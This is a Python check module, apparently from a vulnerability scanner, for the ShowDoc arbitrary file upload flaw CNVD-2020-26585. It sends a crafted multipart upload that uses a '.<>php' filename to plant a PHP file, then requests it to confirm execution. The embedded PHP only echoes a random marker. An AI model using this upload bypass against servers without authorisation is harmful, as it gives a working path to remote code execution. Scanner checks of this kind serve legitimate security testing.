#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5, random_num
from lib.tool import check
import re

randomNum = random_num(24)
randomStr_1 = random_md5()
randomStr_2 = random_md5()

cnvd_2020_26585_payloads = [
    {
        'path': 'index.php?s=/home/page/uploadImg',
        'data': '----------------------------{NUM}\n'\
                'Content-Disposition: form-data; name="editormd-image-file"; filename="{FILENAME}.<>php"\n'\
                'Content-Type: text/plain\n'\
                '\n'\
                '<?php echo "{RCEMD}"?>\n'\
                '----------------------------{NUM}--'.format(NUM=randomNum, FILENAME=randomStr_1, RCEMD=randomStr_2),
        'headers': {'Content-Type': 'multipart/form-data; boundary=--------------------------{NUM}'.format(NUM=randomNum)}
    }
]

def cnvd_2020_26585_scan(clients):
    ''' api_page存在任意文件上传 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'ShowDoc',
        'vul_type': 'FileUpload',
        'vul_id': 'CNVD-2020-26585',
    }

    for payload in cnvd_2020_26585_payloads:
        path = payload['path']
        data = payload['data']
        headers = payload['headers']

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        file_path = re.search(r'(http){1}.*(\.php){1}', res.text)             # * 是否返回了文件路径
        if (('"success":1' in res.text) and file_path):
            file_path = file_path.group()                                     # * 提取返回的文件路径
            file_path = file_path.replace('\\', '')                           # * 替换反斜杠\ 改为合法url

            res2 = client.request(
                'get',
                file_path,
                allow_redirects=False,
                vul_info=vul_info,
            )
            if res2 is None:
                continue

            if (check.check_res(res2.text, randomStr_2)):
                results = {
                    'Target': res.request.url,
                    'Verify': res2.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request-1': res,
                    'Request-2': res2
                }
                return results
    return None
